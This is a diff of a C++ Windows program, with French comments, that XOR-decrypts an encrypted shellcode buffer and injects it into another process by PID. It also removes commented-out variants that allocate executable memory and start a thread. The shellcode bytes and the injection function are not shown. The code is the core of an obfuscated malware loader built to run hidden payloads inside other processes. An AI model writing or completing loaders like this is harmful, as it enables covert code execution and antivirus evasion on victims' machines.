@@ -6,7 +6,7 @@
 #include <iostream>
 
 const unsigned char encryptionKey = 0xAA;
-DWORD pid = 7512;
+DWORD pid = 13828; // Si code d'erreur est virtaul alloc 5 =le logiciel n'est pas lancé |||| si code erreur 87 le PID mauvais 
 
 int main()
 {
@@ -31,36 +31,12 @@ int main()
         decryptedPayload[i] = shell[i] ^ encryptionKey;
     }
 
-    //UCHAR decryptedPayload[SHELLCODE_SIZE] = {};
-
-    //for (size_t i = 0; i < sPayloadSize; ++i) {
-    //    decryptedPayload[i] = shell[i] ^ encryptionKey;
-    //}
-    //for (size_t i = 0; i < SHELLCODE_SIZE - 1; ++i) {
-    //    decryptedPayload[i] = shell[i] ^ KEY[i % KEY_SIZE];
-
-    //    printf("/%x", decryptedPayload[i]);
-    //};
+    // Injecte le shell code avant le déchiffrement
+    //InjectShellcode(shell, SHELLCODE_SIZE, pid);
 
 
-    
-
-    /*InjectShellcode(shell, SHELLCODE_SIZE, pid);*/
+   // Injecte le shell code après le déchiffrement
 
     InjectShellcode(decryptedPayload, SHELLCODE_SIZE, pid);
 
-    printf("%s", shell);
-
-    //WriteProcessMemory(GetCurrentProcess(), addr, decryptedPayload, sPayloadSize, &bytesWritten);
-
-    //DWORD dwPro;
-    //VirtualProtect(addr, sPayloadSize, PAGE_EXECUTE_READ, &dwPro);
-
-    //CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
-
-    Sleep(10000);
-    //void (*ret)() = (void(*)())addr;
-    //ret();
-
-   //VirtualFree(addr, 0, MEM_RELEASE);
 }
